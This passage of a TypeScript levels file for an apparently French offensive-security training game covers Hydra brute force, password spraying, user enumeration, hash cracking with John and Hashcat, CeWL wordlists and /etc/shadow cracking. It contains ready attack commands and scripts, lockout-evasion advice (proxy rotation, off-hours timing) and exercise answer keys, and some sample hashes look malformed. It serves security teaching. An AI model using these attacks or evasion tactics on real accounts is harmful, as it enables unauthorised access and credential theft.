import type { Level } from './_types';

export const levels121_130: Level[] = [
  {
    id: 121,
    title: "Hydra — Brute-force SSH",
    difficulty: 'advanced',
    category: "Auth Attacks",
    objective: "Effectuer une attaque par force brute SSH avec Hydra",
    description: "Hydra est un craqueur de connexion réseau parallèle qui supporte de nombreux protocoles : SSH, FTP, HTTP, RDP, etc. Il fonctionne en essayant automatiquement des combinaisons identifiant/mot de passe contre un service d'authentification. Les options clés sont : `-l` pour un utilisateur unique, `-L` pour une liste d'utilisateurs, `-p` pour un mot de passe fixe, `-P` pour une wordlist, `-t` pour le nombre de threads parallèles, et `-V` pour afficher chaque tentative. Sur SSH, limiter les threads (`-t 4`) est recommandé car beaucoup de serveurs bloquent les connexions trop rapides.",
    commands: ['hydra'],
    hints: [
      "Lance une attaque SSH basique : `hydra -l admin -P wordlist_small.txt ssh://192.168.1.100`",
      "Réduis les threads pour éviter le blocage : ajoute `-t 4` (SSH supporte mal la parallélisation élevée)",
      "Pour tester plusieurs utilisateurs en même temps : `hydra -L userlist.txt -P wordlist_small.txt -t 4 -V ssh://192.168.1.100`"
    ],
    fileSystem: {
      'wordlist_small.txt': `password
123456
admin
letmein
qwerty
password123
welcome
monkey
dragon
iloveyou`,
      'userlist.txt': `admin
root
user
test
operator`,
      'hydra_cheatsheet.txt': `=== HYDRA CHEATSHEET ===

SYNTAXE DE BASE
  hydra [options] CIBLE SERVICE

OPTIONS PRINCIPALES
  -l LOGIN        Identifiant unique
  -L FICHIER      Liste d'identifiants
  -p PASS         Mot de passe unique
  -P FICHIER      Wordlist de mots de passe
  -t N            Threads parallèles (défaut: 16)
  -V              Mode verbose (affiche chaque tentative)
  -f              Stop après la première trouvaille
  -s PORT         Port personnalisé
  -o FICHIER      Sauvegarde les résultats

PROTOCOLES COURANTS
  ssh://target            SSH (port 22)
  ftp://target            FTP (port 21)
  http-get://target       HTTP Basic Auth
  http-post-form://...    Formulaire HTTP POST
  smb://target            SMB/Windows shares
  rdp://target            Remote Desktop Protocol

EXEMPLES
  hydra -l root -P rockyou.txt ssh://10.0.0.1
  hydra -L users.txt -p Password123 -t 4 ssh://192.168.1.1
  hydra -l admin -P wordlist.txt ftp://192.168.1.50

CONSEILS
  - SSH: utiliser -t 4 (rate limiting des serveurs)
  - Toujours obtenir une autorisation écrite avant de tester
  - Wordlists populaires: /usr/share/wordlists/rockyou.txt`
    },
    validation: [
      { type: 'command', value: 'hydra', description: 'Lancer une attaque brute-force avec Hydra' }
    ],
    story: "🔨 Un serveur SSH tourne sur le réseau interne. L'équipe de sécurité t'a mandaté pour tester la robustesse des mots de passe. Wordlist en main, lance Hydra et découvre si les comptes résistent à une attaque par dictionnaire !"
  },

  {
    id: 122,
    title: "Hydra — Brute-force HTTP",
    difficulty: 'advanced',
    category: "Auth Attacks",
    objective: "Attaquer un formulaire de connexion HTTP avec Hydra",
    description: "Attaquer un formulaire web avec Hydra nécessite d'utiliser le module `http-post-form`. La syntaxe du module prend trois paramètres séparés par `:` : le chemin du formulaire, les paramètres POST avec les marqueurs `^USER^` et `^PASS^`, et enfin la chaîne de caractères présente en cas d'échec d'authentification. Pour trouver la chaîne d'échec, il faut analyser la réponse du serveur lors d'un login raté — par exemple `Invalid credentials` ou `Login failed`. Il est crucial d'identifier correctement les noms des champs HTML du formulaire en inspectant le code source de la page.",
    commands: ['hydra'],
    hints: [
      "Syntaxe http-post-form : `hydra -l admin -P wordlist.txt target http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"`",
      "Trouve la chaîne d'échec en testant manuellement : `curl -s -d 'user=wrong&pass=wrong' http://target/login | grep -i 'error\\|invalid\\|failed'`",
      "Ajoute `-f` pour arrêter dès la première réussite et `-V` pour voir chaque tentative en temps réel"
    ],
    fileSystem: {
      'form_analysis_guide.txt': `=== ANALYSER UN FORMULAIRE WEB POUR HYDRA ===

ÉTAPE 1 - Identifier les champs du formulaire
  Méthode manuelle : curl -s http://target/login | grep '<form\|<input'
  Cherche : name="username", name="password", etc.

  Exemple de formulaire trouvé :
    <form method="POST" action="/login">
      <input name="user" type="text">
      <input name="passwd" type="password">
      <input name="csrf_token" type="hidden" value="abc123">
    </form>

ÉTAPE 2 - Identifier la chaîne d'échec
  Test avec de mauvais credentials :
    curl -s -X POST -d 'user=wrong&passwd=wrong' http://target/login

  Cherche dans la réponse :
    "Invalid credentials"
    "Login failed"
    "Wrong password"
    "Authentication error"

ÉTAPE 3 - Construire la commande Hydra
  Format : "/path:field1=^USER^&field2=^PASS^:FAIL_STRING"

  Exemple complet :
    hydra -l admin -P passwords.txt 192.168.1.100 \\
      http-post-form "/login:user=^USER^&passwd=^PASS^:Invalid credentials"

TOKENS CSRF
  Si le formulaire a un token CSRF, Hydra seul ne suffit plus.
  Utiliser Burp Suite ou un script Python avec requests + BeautifulSoup.

CONSEILS
  - Vérifier si HTTP ou HTTPS (utiliser https-post-form pour TLS)
  - Regarder les cookies de session retournés
  - Tester d'abord manuellement avant d'automatiser`,
      'hydra_http_examples.txt': `=== EXEMPLES HYDRA HTTP ===

1. POST Form basique
   hydra -l admin -P rockyou.txt 10.0.0.1 \\
     http-post-form "/login:username=^USER^&password=^PASS^:Login failed"

2. POST Form avec port custom
   hydra -l user -P list.txt -s 8080 10.0.0.1 \\
     http-post-form "/auth:u=^USER^&p=^PASS^:error"

3. GET Form (authentification basique HTTP)
   hydra -l admin -P list.txt http-get://10.0.0.1/admin/

4. HTTPS POST Form
   hydra -l admin -P list.txt 10.0.0.1 \\
     https-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

5. Plusieurs utilisateurs
   hydra -L users.txt -P passes.txt 10.0.0.1 \\
     http-post-form "/login:email=^USER^&password=^PASS^:Wrong"

6. Avec cookies de session
   hydra -l admin -P list.txt 10.0.0.1 \\
     http-post-form "/login:user=^USER^&pass=^PASS^:H=Cookie\\: session=abc:error"

RÉCUPÉRER LES INFORMATIONS NÉCESSAIRES
  # Voir les headers de réponse
  curl -I http://10.0.0.1/login

  # Voir le code source du formulaire
  curl -s http://10.0.0.1/login | grep -A5 '<form'

  # Simuler un login raté
  curl -s -c cookies.txt -b cookies.txt \\
    -d 'user=test&pass=test' http://10.0.0.1/login`
    },
    validation: [
      { type: 'command', value: 'hydra', description: 'Lancer Hydra contre un formulaire HTTP' }
    ],
    story: "🌐 Une application web interne expose un panneau d'administration. Pas de lockout configuré, wordlist prête. Analyse le formulaire de login, identifie les champs et la chaîne d'erreur, puis laisse Hydra faire le reste !"
  },

  {
    id: 123,
    title: "John the Ripper — Crack de hashes",
    difficulty: 'intermediate',
    category: "Password Cracking",
    objective: "Cracker des hashes de mots de passe avec John",
    description: "John the Ripper est l'outil de référence pour le craquage de mots de passe hors-ligne. Il détecte automatiquement de nombreux formats de hash, mais on peut forcer le format avec `--format=`. Il supporte plusieurs modes : attaque par wordlist (`--wordlist=`), attaque par règles de transformation (`--rules`), et mode incrémental (brute-force pur). Une fois le craquage terminé ou interrompu, `john --show hash.txt` affiche les mots de passe trouvés. John maintient une session de progression dans `~/.john/john.pot` — les hashes déjà craqués ne sont pas retraités.",
    commands: ['john'],
    hints: [
      "Lance John avec une wordlist : `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`",
      "Force le format MD5 si la détection auto échoue : `john --format=raw-md5 --wordlist=rockyou.txt hashes.txt`",
      "Affiche les mots de passe trouvés : `john --show hashes.txt` — les résultats sont aussi dans `~/.john/john.pot`"
    ],
    fileSystem: {
      'hashes.txt': `# Format: hash:identifiant (pour référence)
5f4dcc3b5aa765d61d8327deb882cf99:user1
e10adc3949ba59abbe56e057f20f883e:user2
25d55ad283aa400af464c76d713c07ad:user3
d8578edf8458ce06fbc5bb76a58c5ca4:user4
5d41402abc4b2a76b9719d911017c592:user5`,
      'john_format_guide.txt': `=== GUIDE DES FORMATS JOHN THE RIPPER ===

FORMATS COURANTS
  --format=raw-md5        Hash MD5 brut (32 hex chars)
  --format=raw-sha1       Hash SHA1 brut (40 hex chars)
  --format=raw-sha256     Hash SHA256 brut (64 hex chars)
  --format=raw-sha512     Hash SHA512 brut (128 hex chars)
  --format=bcrypt         Bcrypt ($2a$, $2b$, $2y$)
  --format=sha512crypt    Linux shadow $6$ (sha512)
  --format=sha256crypt    Linux shadow $5$ (sha256)
  --format=md5crypt       Linux shadow $1$ (md5)
  --format=nt             NTLM Windows
  --format=lm             LM Windows (legacy)

IDENTIFIER LE FORMAT
  Longueur 32 hex  → probablement MD5
  Longueur 40 hex  → probablement SHA1
  Longueur 64 hex  → probablement SHA256
  Commence par $1$ → md5crypt (Linux)
  Commence par $2a$→ bcrypt
  Commence par $5$ → sha256crypt (Linux)
  Commence par $6$ → sha512crypt (Linux)
  Commence par $y$ → yescrypt (moderne)

COMMANDES ESSENTIELLES
  # Craquage basique (détection auto du format)
  john hashes.txt

  # Avec wordlist spécifique
  john --wordlist=rockyou.txt hashes.txt

  # Forcer le format
  john --format=raw-md5 --wordlist=rockyou.txt hashes.txt

  # Ajouter des règles de transformation
  john --wordlist=rockyou.txt --rules hashes.txt

  # Voir les résultats
  john --show hashes.txt
  john --show --format=raw-md5 hashes.txt

  # Lister les formats supportés
  john --list=formats

RÈGLES DE TRANSFORMATION (--rules)
  Applique des mutations : capitalisation, ajout de chiffres,
  substitution l33tspeak (a→@, e→3, etc.), suffixes communs.
  Exemple : "password" → "P@ssw0rd", "Password1", "passw0rd!"

HASHES DE L'EXERCICE (valeurs attendues)
  5f4dcc3b5aa765d61d8327deb882cf99 = "password"
  e10adc3949ba59abbe56e057f20f883e = "123456"
  25d55ad283aa400af464c76d713c07ad = "12345678"
  d8578edf8458ce06fbc5bb76a58c5ca4 = "qwerty"
  5d41402abc4b2a76b9719d911017c592 = "hello"`
    },
    validation: [
      { type: 'command', value: 'john', description: 'Cracker des hashes avec John the Ripper' }
    ],
    story: "🔓 Tu as récupéré un fichier de hashes lors d'un audit. Les mots de passe sont des classiques du top 10. Lance John avec une bonne wordlist et révèle les secrets cachés derrière ces empreintes MD5 !"
  },

  {
    id: 124,
    title: "Hashcat — GPU cracking",
    difficulty: 'advanced',
    category: "Password Cracking",
    objective: "Utiliser hashcat pour cracker des hashes avec GPU et règles",
    description: "Hashcat est l'outil de craquage de mots de passe le plus rapide du monde grâce à l'accélération GPU. Il supporte plus de 300 types de hash via l'option `-m` (0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt Linux). Les modes d'attaque sont définis par `-a` : 0 pour attaque par dictionnaire, 1 pour combinaison, 3 pour brute-force avec masques, 6 pour dictionnaire+masque. Les masques utilisent des placeholders : `?l` (minuscule), `?u` (majuscule), `?d` (chiffre), `?s` (symbole), `?a` (tous). Les règles (`--rules-file`) transforment les mots de la wordlist pour créer des variations.",
    commands: ['hashcat'],
    hints: [
      "Attaque MD5 par dictionnaire : `hashcat -m 0 -a 0 sample_hashes.txt /usr/share/wordlists/rockyou.txt`",
      "Brute-force d'un PIN 4 chiffres (masque) : `hashcat -m 0 -a 3 hash.txt ?d?d?d?d` — `?d` = digit",
      "Avec règles Best64 pour mutations : `hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`"
    ],
    fileSystem: {
      'hashcat_modes.txt': `=== MODES DE HASH HASHCAT (-m) ===

HASH GÉNÉRAUX
  0      MD5
  10     md5($pass.$salt)
  20     md5($salt.$pass)
  100    SHA1
  1300   SHA-224
  1400   SHA-256
  1700   SHA-512
  3200   bcrypt ($2*$)

WINDOWS / ACTIVE DIRECTORY
  1000   NTLM (NT hash — Windows login)
  3000   LM (LanManager — Windows legacy)
  5500   NetNTLMv1
  5600   NetNTLMv2 (capturé avec Responder)
  13100  Kerberos 5 TGS (Kerberoasting)

LINUX
  500    md5crypt ($1$ — vieux)
  1800   sha512crypt ($6$ — moderne)
  7400   sha256crypt ($5$)

BASES DE DONNÉES
  300    MySQL 4.1/5+
  3100   Oracle H
  131    MSSQL (2000)

WEB / APPLICATIONS
  400    WordPress (phpass)
  2611   vBulletin
  11    Joomla

MODES D'ATTAQUE (-a)
  0  Wordlist seule
  1  Combinaison (word1 + word2)
  3  Brute-force par masque
  6  Wordlist + masque suffixe
  7  Masque préfixe + wordlist

MASQUES COURANTS
  ?l = abcdefghijklmnopqrstuvwxyz
  ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
  ?d = 0123456789
  ?s = !@#$%^&*...
  ?a = ?l?u?d?s (tous)

  Exemples :
  ?d?d?d?d          PIN 4 chiffres (10K combinaisons)
  ?u?l?l?l?d?d?d?d  Format Pass1234 (~45M combis)
  ?a?a?a?a?a?a?a?a  Tous 8 chars (~6T combis)`,
      'sample_hashes.txt': `# Hashes MD5 à cracker (mode -m 0)
5f4dcc3b5aa765d61d8327deb882cf99
e10adc3949ba59abbe56e057f20f883e
25d55ad283aa400af464c76d713c07ad
d8578edf8458ce06fbc5bb76a58c5ca4
827ccb0eea8a706c4c34a16891f84e7b`
    },
    validation: [
      { type: 'command', value: 'hashcat', description: 'Lancer une attaque hashcat' }
    ],
    story: "⚡ Le RSSI a retrouvé une base NTLM exportée d'un vieux contrôleur de domaine. Hashcat avec le GPU va transformer ces hashes en mots de passe en quelques secondes. Choisis le bon mode, la bonne wordlist, et laisse la puissance du GPU faire le travail !"
  },

  {
    id: 125,
    title: "CeWL — Génération de wordlist personnalisée",
    difficulty: 'intermediate',
    category: "Auth Attacks",
    objective: "Générer une wordlist à partir d'un site web avec CeWL",
    description: "CeWL (Custom Word List generator) est un outil Ruby qui spider un site web et extrait les mots pour créer une wordlist personnalisée. L'idée est que les employés d'une entreprise utilisent souvent des mots liés à leur domaine (nom du produit, jargon métier, noms de projets) dans leurs mots de passe. Les options clés sont : `-d` pour la profondeur de crawl, `-m` pour la longueur minimale des mots, `-w` pour le fichier de sortie, et `--with-numbers` pour inclure les mots contenant des chiffres. La wordlist générée peut ensuite être combinée avec John ou Hashcat pour des attaques ciblées.",
    commands: ['cewl'],
    hints: [
      "Génération basique : `cewl http://target.com -w wordlist.txt` — crawle le site et extrait les mots",
      "Paramètres avancés : `cewl http://target.com -d 3 -m 6 --with-numbers -w custom_words.txt` (profondeur 3, min 6 chars, avec chiffres)",
      "Combiner avec John : `john --wordlist=custom_words.txt --rules hashes.txt` — les règles appliquent des mutations sur ta wordlist"
    ],
    fileSystem: {
      'cewl_example_output.txt': `# Exemple de wordlist générée par CeWL sur un site corporate fictif
# Commande : cewl http://techcorp-example.com -d 2 -m 5 -w output.txt

TechCorp
innovation
solutions
management
enterprise
security
network
platform
digital
transformation
infrastructure
deployment
architecture
development
performance
analytics
dashboard
corporate
customer
service
Technology
Corporate
Solutions
Admin2024
TechCorp2023
Innovation
Platform
Network2024
Security
Manager`,
      'cewl_strategy_guide.txt': `=== STRATÉGIE CEWL POUR PENTEST ===

OBJECTIF
  Les gens choisissent des mots de passe liés à leur contexte :
  - Nom de l'entreprise + année : TechCorp2024
  - Nom du produit + symbole : P@ssw0rd
  - Jargon métier + chiffres : Admin123!

  CeWL exploite cette tendance humaine.

WORKFLOW RECOMMANDÉ

  1. GÉNÉRER LA WORDLIST
     cewl http://target.com -d 3 -m 5 --with-numbers -w raw_words.txt

  2. NETTOYER ET ENRICHIR
     # Ajouter des variantes d'année
     for word in $(cat raw_words.txt); do
       echo "\${word}2024"
       echo "\${word}2023"
       echo "\${word}!"
       echo "\${word}123"
     done >> enriched.txt
     cat raw_words.txt enriched.txt | sort -u > final_wordlist.txt

  3. APPLIQUER DES RÈGLES JOHN
     john --wordlist=final_wordlist.txt --rules hashes.txt

  4. APPLIQUER DES RÈGLES HASHCAT
     hashcat -m 0 -a 0 hashes.txt final_wordlist.txt -r best64.rule

SOURCES SUPPLÉMENTAIRES
  - LinkedIn de l'entreprise (noms d'employés, postes)
  - Offres d'emploi (technologies utilisées)
  - GitHub de l'organisation (noms de projets, README)
  - Réseaux sociaux (#hashtags utilisés)

OPTIONS CEWL UTILES
  --auth_type basic    Authentification HTTP basique
  --auth_user USER     Identifiant pour sites protégés
  --auth_pass PASS     Mot de passe pour sites protégés
  --ua "Mozilla/5.0"   Changer le User-Agent
  --meta               Extraire aussi les métadonnées
  -e / --email         Extraire les adresses email`
    },
    validation: [
      { type: 'command', value: 'cewl', description: 'Générer une wordlist avec CeWL' }
    ],
    story: "🕷️ Tu vas attaquer un portail RH. Avant de lancer Hydra avec rockyou.txt (trop générique), tu décides d'être malin : spider le site de l'entreprise avec CeWL pour construire une wordlist sur mesure avec le jargon de la boîte. Qualité > quantité !"
  },

  {
    id: 126,
    title: "Énumération d'utilisateurs",
    difficulty: 'intermediate',
    category: "Auth Attacks",
    objective: "Énumérer les utilisateurs valides via les timing attacks et messages d'erreur",
    description: "L'énumération d'utilisateurs exploite les différences de comportement d'une application selon que l'identifiant existe ou non. Beaucoup d'applications révèlent involontairement si un compte existe : message d'erreur différent (`'Mot de passe incorrect'` vs `'Utilisateur inconnu'`), temps de réponse différent (car le serveur calcule le hash du mot de passe seulement si l'utilisateur existe), ou comportement SMTP (commande VRFY). Identifier les comptes valides en amont réduit drastiquement l'espace de recherche pour un brute-force ultérieur.",
    commands: ['curl', 'for'],
    hints: [
      "Comparer les messages d'erreur : `curl -s -X POST -d 'user=admin&pass=wrong' http://target/login` puis `curl -s -X POST -d 'user=notexist&pass=wrong' http://target/login`",
      "Boucle bash pour tester une liste : `for u in $(cat users.txt); do echo -n \"$u: \"; curl -s -d \"user=$u&pass=wrong\" http://target/login | grep -o 'Invalid.*'; done`",
      "Mesurer les temps de réponse : `for u in $(cat users.txt); do echo -n \"$u: \"; time curl -s -d \"user=$u&pass=wrong\" http://target/login > /dev/null; done`"
    ],
    fileSystem: {
      'user_enum_techniques.txt': `=== TECHNIQUES D'ÉNUMÉRATION D'UTILISATEURS ===

1. MESSAGES D'ERREUR DIFFÉRENCIÉS (le plus simple)
   Mauvais design :
     user inconnu  → "This user does not exist."
     mauvais pass  → "Incorrect password."

   Comment l'exploiter :
     curl -s -d 'user=TEST&pass=X' http://target/login | grep -i 'exist\|invalid\|error'

   Si la réponse diffère selon le user → énumération possible.

2. TIMING ATTACK
   Un serveur bien codé calcule bcrypt même si le user n'existe pas.
   Un serveur mal codé retourne immédiatement si le user est inconnu.

   Mesure :
     time curl -s -d 'user=admin&pass=X' http://target/login
     time curl -s -d 'user=zzzznotexist&pass=X' http://target/login

   Si différence > 200ms → timing leak.

3. SMTP VRFY (serveurs mail)
   Vérifier si un utilisateur existe sur un serveur SMTP :
     nc mail.target.com 25
     VRFY admin@target.com
     VRFY test@target.com

   Réponses :
     250 admin@target.com → utilisateur valide
     550 Unknown user     → utilisateur invalide

4. SMTP RCPT TO (alternative si VRFY désactivé)
     MAIL FROM:<attacker@evil.com>
     RCPT TO:<admin@target.com>   → 250 OK = valide
     RCPT TO:<fake@target.com>    → 550 = invalide

5. LDAP / KERBEROS (AD)
   kerbrute userenum --dc 10.0.0.1 -d corp.local users.txt
   Kerberos retourne AS-REQ différent si user valide.

CONTRE-MESURES
  - Messages d'erreur identiques ("Identifiants invalides")
  - Temps de réponse constant (padding artificiel)
  - Rate limiting par IP
  - CAPTCHA après N tentatives`,
      'enum_bash_template.sh': `#!/bin/bash
# Template d'énumération d'utilisateurs par HTTP

TARGET="http://target.com/login"
USERLIST="users_to_test.txt"
VALID_STRING="Invalid password"    # Message si USER VALIDE
INVALID_STRING="User not found"    # Message si USER INVALIDE

echo "[*] Démarrage de l'énumération d'utilisateurs"
echo "[*] Cible : $TARGET"
echo "---"

while read -r username; do
  RESPONSE=$(curl -s -X POST \
    -d "user=\${username}&pass=WRONGPASSWORD123" \
    "$TARGET")

  if echo "$RESPONSE" | grep -q "$VALID_STRING"; then
    echo "[+] VALIDE : $username"
  elif echo "$RESPONSE" | grep -q "$INVALID_STRING"; then
    echo "[-] Invalide : $username"
  else
    echo "[?] Ambigu : $username"
  fi

  sleep 0.5  # Rate limiting pour ne pas se faire bloquer

done < "$USERLIST"

echo "---"
echo "[*] Énumération terminée"`
    },
    validation: [
      { type: 'command', value: 'curl', description: 'Utiliser curl pour tester les réponses du serveur' }
    ],
    story: "🕵️ Avant de brute-forcer un service, il faut réduire la surface. Certaines applis trahissent leurs utilisateurs valides dans leurs messages d'erreur. Exploite ces micro-différences pour construire ta liste de cibles avant de passer à l'attaque !"
  },

  {
    id: 127,
    title: "Password Spraying",
    difficulty: 'advanced',
    category: "Auth Attacks",
    objective: "Effectuer un password spraying pour éviter le blocage de compte",
    description: "Le password spraying est l'inverse du brute-force classique : au lieu d'essayer de nombreux mots de passe sur un seul compte (risque de lockout), on essaie un seul mot de passe faible sur de nombreux comptes. Cette technique contourne les politiques de verrouillage de compte qui bloquent après N tentatives échouées sur un même compte. Les cibles privilégiées sont les services exposés : OWA (Outlook Web Access), Office 365, VPN, portails RH. Les mots de passe les plus efficaces sont les variantes saisonnières comme `Printemps2024!` ou `Janvier@2024`.",
    commands: ['hydra', 'curl'],
    hints: [
      "Spraying avec Hydra (un mot de passe, liste d'users) : `hydra -L userlist.txt -p 'Printemps2024!' -t 4 ssh://192.168.1.100`",
      "Respecter les délais entre tentatives : ajoute `-W 30` (30s d'attente) pour rester sous le radar des lockout policies",
      "Tester via curl contre une API : `while read u; do curl -s -d \"user=$u&pass=Entreprise2024\" http://target/api/login | grep -q 'success' && echo \"FOUND: $u\"; sleep 2; done < userlist.txt`"
    ],
    fileSystem: {
      'password_spraying_strategy.txt': `=== GUIDE STRATÉGIQUE : PASSWORD SPRAYING ===

DIFFÉRENCE BRUTE-FORCE vs SPRAYING

  Brute-force classique :
    admin  → password1, password2, password3... (lockout après 5 essais)

  Password Spraying :
    admin     → Printemps2024!
    user1     → Printemps2024!
    user2     → Printemps2024!  ← Aucun compte ne dépasse le seuil
    user3     → Printemps2024!

QUAND L'UTILISER
  - Politique de lockout active (ex: 5 tentatives → 30min de blocage)
  - Grande liste d'utilisateurs connue (Active Directory, LDAP, OSINT)
  - Service exposé : OWA, Office365, VPN SSL, portail RH

CIBLES PRIVILÉGIÉES
  Microsoft OWA / Exchange :
    curl -s -d 'username=USER&password=PASS' https://mail.corp.com/owa/

  Office 365 :
    Outils spécialisés : MSOLSpray, Spray365, TeamFiltration

  SSH / VPN :
    hydra -L users.txt -p 'Summer2024!' ssh://vpn.corp.com

RYTHME ET DISCRÉTION
  - Attendre au moins 30 min entre chaque vague de tentatives
  - Ne jamais dépasser N-1 tentatives (N = seuil de lockout)
  - Varier les IPs si possible (rotation de proxies)
  - Éviter les heures ouvrées pour moins de monitoring

DÉTECTION (côté défense)
  - Alertes sur N comptes différents depuis même IP
  - Corrélation temporelle des échecs d'auth
  - Azure AD Identity Protection, SIEM avec règles spraying`,
      'common_passwords.txt': `# Top passwords pour password spraying
# Combinaisons saison+année les plus utilisées

# Classics
Password1
Welcome1
Admin123
Letmein1
Changeme1

# Saisons + années (très courant en entreprise)
Printemps2024!
Ete2024!
Automne2024!
Hiver2024!
Spring2024!
Summer2024!
Fall2024!
Winter2024!

# Entreprise générique
Entreprise2024
Company2024!
Corporate1
Bienvenue1

# Mois courants
Janvier2024!
Fevrier2024!
Mars2024!
Avril2024!`
    },
    validation: [
      { type: 'command', value: 'hydra', description: 'Effectuer un password spraying avec Hydra' }
    ],
    story: "🎯 L'Active Directory de la cible a une politique : 5 tentatives puis lockout 30 minutes. Le brute-force est impossible. Mais avec la liste des 200 employés récupérée sur LinkedIn et les passwords saisonniers... le spraying va passer sous le radar. Un mot de passe. Tous les comptes. Discrètement !"
  },

  {
    id: 128,
    title: "Hash identification",
    difficulty: 'intermediate',
    category: "Password Cracking",
    objective: "Identifier le type de hash avant de le cracker",
    description: "Avant de cracker un hash, il faut identifier son type pour choisir le bon mode de craquage. La longueur et les caractères du hash donnent des indices : 32 hex = MD5, 40 hex = SHA1, 64 hex = SHA256. Les hash Linux commencent par un identifiant entre `$` : `$1$`=MD5, `$5$`=SHA256, `$6$`=SHA512, `$2a$`=bcrypt. Les outils `hash-identifier` et `hashid` automatisent cette identification. Pour les hash inconnus, des bases en ligne comme CrackStation ou HashKiller permettent de vérifier si le hash est déjà dans leurs tables arc-en-ciel.",
    commands: ['hash-identifier', 'hashid'],
    hints: [
      "Identifier un hash avec hash-identifier : `hash-identifier` puis colle ton hash, ou en ligne de commande : `echo 'HASH' | hash-identifier`",
      "Utiliser hashid pour avoir le mode hashcat directement : `hashid -m 5f4dcc3b5aa765d61d8327deb882cf99` — donne le type ET le numéro de mode hashcat",
      "Reconnaître visuellement : 32 chars hex = MD5, 40 = SHA1, 64 = SHA256, commence par `$6$` = sha512crypt Linux (mode hashcat 1800)"
    ],
    fileSystem: {
      'mystery_hashes.txt': `# Cinq hashes mystérieux — identifie leur type !

HASH_A: 5f4dcc3b5aa765d61d8327deb882cf99

HASH_B: aaf4c61ddcc5e8a2dabede0f3b482cd9aeab8ad1

HASH_C: 5e884898da28047151d0e56f8dc6292773603d0d56f6d29c4d46d52d45b

HASH_D: $6$rounds=5000$usesomesalt$kBapHPDiLg/GX/ZsYMFiGqMLmDFqGJEbSuAa.4PIe/i.dMIFCXQFKKImCCNqQ3JREBElDRKxqFalGWX6Qa/2.

HASH_E: $2a$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewdBPj/lHqFrJWwq`,
      'hash_identification_guide.txt': `=== GUIDE D'IDENTIFICATION DES HASHES ===

MÉTHODE 1 : ANALYSE VISUELLE

  LONGUEUR (hex uniquement)
  ┌─────────────┬───────────┬──────────────────────┐
  │ Longueur    │ Type      │ Exemple (tronqué)    │
  ├─────────────┼───────────┼──────────────────────┤
  │ 32 chars    │ MD5       │ 5f4dcc3b5aa765d6...  │
  │ 40 chars    │ SHA1      │ aaf4c61ddcc5e8a2...  │
  │ 56 chars    │ SHA224    │ 5e884898da280471...  │
  │ 64 chars    │ SHA256    │ ef92b778bafe771e...  │
  │ 96 chars    │ SHA384    │ ...                  │
  │ 128 chars   │ SHA512    │ ...                  │
  └─────────────┴───────────┴──────────────────────┘

  PRÉFIXES (Unix/Linux shadow)
  $1$   = MD5crypt      (mode hashcat: 500)
  $2a$  = bcrypt        (mode hashcat: 3200)
  $2b$  = bcrypt        (mode hashcat: 3200)
  $5$   = SHA256crypt   (mode hashcat: 7400)
  $6$   = SHA512crypt   (mode hashcat: 1800)
  $y$   = yescrypt      (mode hashcat: 3400)

  WINDOWS
  32 chars, NTLM : généralement pas de sel, tout en minuscules
  Exemple NTLM : 8846f7eaee8fb117ad06bdd830b7586c

MÉTHODE 2 : OUTILS AUTOMATIQUES

  hash-identifier (interactif)
    hash-identifier
    > Colle ton hash et appuie Entrée

  hashid (ligne de commande, recommandé)
    hashid HASH              # Identifie le type
    hashid -m HASH           # Ajoute le mode hashcat
    hashid -j HASH           # Ajoute le mode john
    hashid -mj HASH          # Les deux

    Exemple :
    $ hashid -m 5f4dcc3b5aa765d61d8327deb882cf99
    [+] MD2 [Hashcat Mode: 9600]
    [+] MD5 [Hashcat Mode: 0]
    [+] MD4 [Hashcat Mode: 900]

MÉTHODE 3 : BASES EN LIGNE
  https://crackstation.net/    Table arc-en-ciel massive
  https://hashkiller.io/       Lookup + cracking
  https://hashes.com/          Identifier + cracker

  ⚠️ Ne jamais soumettre de hashes confidentiels en ligne !

RÉPONSES DE L'EXERCICE
  HASH_A → MD5 (32 chars hex)
  HASH_B → SHA1 (40 chars hex)
  HASH_C → SHA224 (56 chars hex)
  HASH_D → sha512crypt Linux ($6$)
  HASH_E → bcrypt ($2a$)`
    },
    validation: [
      { type: 'command', value: 'hashid', description: 'Identifier le type de hash avec hashid' }
    ],
    story: "🔍 Quelqu'un t'a envoyé cinq hashes sans préciser leur format. Brute-forcer avec le mauvais mode = perte de temps. Avant de cracker quoi que ce soit, identifie chaque hash : longueur, préfixe, outils dédiés. Le bon diagnostic précède la bonne attaque !"
  },

  {
    id: 129,
    title: "Unshadow & /etc/passwd + /etc/shadow",
    difficulty: 'intermediate',
    category: "Password Cracking",
    objective: "Combiner passwd et shadow pour cracker les mots de passe Linux",
    description: "Sous Linux, les informations d'authentification sont réparties entre `/etc/passwd` (lisible par tous, contient les noms d'utilisateurs et infos de compte) et `/etc/shadow` (lisible uniquement par root, contient les hashes des mots de passe). L'outil `unshadow` combine ces deux fichiers dans le format que John the Ripper peut traiter. Le format de `/etc/shadow` encode le type de hash dans le préfixe : `$1$`=MD5, `$5$`=SHA256, `$6$`=SHA512. Après avoir obtenu les deux fichiers (via une fuite de données, une mauvaise configuration ou une élévation de privilèges), on peut lancer John sur le fichier combiné.",
    commands: ['unshadow', 'john'],
    hints: [
      "Combiner les fichiers : `unshadow sample_passwd.txt sample_shadow.txt > combined.txt` — produit le format attendu par John",
      "Lancer John sur le résultat : `john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt`",
      "Afficher les mots de passe craqués : `john --show combined.txt` — John utilise `~/.john/john.pot` pour stocker les résultats"
    ],
    fileSystem: {
      'sample_passwd.txt': `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
alice:x:1001:1001:Alice Martin,,,:/home/alice:/bin/bash
bob:x:1002:1002:Bob Dupont,,,:/home/bob:/bin/bash
charlie:x:1003:1003:Charlie Durand,,,:/home/charlie:/bin/bash
svchttp:x:1004:1004:HTTP Service Account,,,:/home/svchttp:/bin/bash`,
      'sample_shadow.txt': `root:$6$rounds=5000$tR2NFBKJNM2k3Q4P$abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJ0123456789abcdefghijk012345:19800:0:99999:7:::
daemon:*:19800:0:99999:7:::
